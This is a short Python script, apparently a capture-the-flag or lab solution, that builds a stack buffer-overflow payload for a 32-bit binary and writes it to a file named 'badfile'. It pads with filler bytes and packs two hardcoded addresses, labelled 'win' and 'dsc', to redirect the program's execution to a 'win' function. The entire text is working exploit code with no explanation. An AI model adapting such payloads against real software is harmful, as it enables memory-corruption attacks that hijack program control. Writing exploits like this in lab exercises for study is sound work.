import struct

dsc = 0x804850b
win = 0x8048539


# PAYLOAD
# [AA..AAA][WIN][BB..BBB][DSC]

p1 = "B"*238
p1 += struct.pack("I",win)

p2 = "A"*(263-len(p1))
p2 += struct.pack("I",dsc)

payload = p1 + p2

f = open("badfile","a")
f.write(payload)
f.close()
